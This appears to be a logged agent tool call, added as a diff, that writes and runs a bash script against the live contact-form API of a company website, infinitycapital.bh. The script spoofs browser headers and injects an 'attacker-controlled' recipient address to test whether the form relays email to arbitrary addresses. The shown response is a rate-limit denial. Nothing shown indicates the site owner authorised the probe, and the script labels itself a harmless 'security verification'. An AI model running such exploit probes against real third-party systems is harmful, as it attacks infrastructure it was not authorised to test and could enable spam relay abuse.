@@ -1,0 +1,36 @@
+# command: cd /work/evidence && cat > relay_verify.sh <<'EOF'
+#!/bin/bash
+BASE="https://www.infinitycapital.bh"
+UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
+send () {
+  tag="$1"; tgt="$2"
+  echo "===== $tag  targets=[$tgt] ====="
+  curl -s -D "R_${tag}.hdr" -o "R_${tag}.json" -X POST "$BASE/api/send" \
+    -H "User-Agent: $UA" -H "Origin: https://www.infinitycapital.bh" \
+    -H "Referer: https://www.infinitycapital.bh/contact" \
+    --max-time 45 \
+    -F "fname=Security" -F "lname=Verifier" -F "areacode=" -F "tel=+9730000" \
+    -F "cname=Independent Verification - please disregard" \
+    -F "subject=Independent Security Verification" \
+    -F "msg=AUTOMATED NON-DESTRUCTIVE SECURITY VERIFICATION. Safe to delete." \
+    -F "check=bot" -F "targets=$tgt"
+  head -1 "R_${tag}.hdr"; grep -i 'x-matched-path\|x-vercel-mitigated' "R_${tag}.hdr"; echo "BODY: $(cat R_${tag}.json)"; echo
+}
+# Malformed recipient -> Resend returns validation error echoing the 'to' field,
+# proving the server forwards the CLIENT-SUPPLIED recipient to Resend (no allow-list).
+send "V_resend_to_echo"  "attacker-controlled-recipient@this-domain-does-not-exist-zzz.invalid"
+EOF
+chmod +x relay_verify.sh && ./relay_verify.sh
+# tool: cat
+# exit_code: 0
+# ts: 2026-09-30T12:07:37.344881+00:00
+# ---
+
+===== V_resend_to_echo  targets=[attacker-controlled-recipient@this-domain-does-not-exist-zzz.invalid] =====
+HTTP/2 429 
+x-vercel-mitigated: deny
+BODY: Too Many Requests
+
+Too Many Requests
+bom1::fmhs8-1790770057325-40b706ffd078
+
